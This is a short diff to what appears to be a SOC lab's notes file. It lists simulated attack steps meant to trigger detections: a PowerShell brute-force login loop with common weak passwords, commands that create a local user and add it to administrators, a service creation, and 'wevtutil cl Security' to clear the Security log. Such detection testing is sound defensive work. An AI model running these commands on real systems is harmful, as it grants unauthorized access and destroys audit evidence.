@@ -1,5 +1,5 @@
 1. Brute Force Login Attack.
-	A) PowerShell script used:
+	PowerShell script used:
 		$users = "admin", "test", "vboxuser"
 		$passwords = "123456", "password", "admin", "wrongpass", "letmein"
 		
@@ -13,17 +13,17 @@
 		}
 	
 2. Unauthorized new user creation.
-	A) PowerShell command used:
+	PowerShell command used:
 		net user soc_test_user [yourpassword] /add
 
 3. User privilege escalation.
-	A) PowerShell command used:
+	PowerShell command used:
 		net localgroup administrators soc_test_user /add
 		
 4. Service creation.
-	A) PowerShell command used:
+	PowerShell command used:
 		sc.exe create trustedService binPath= "C:\Windows\System32\notepad.exe"
 		
 5. Attempting to clear the machine's logs.
-	A) PowerShell command used:
+	PowerShell command used:
 		wevtutil cl Security
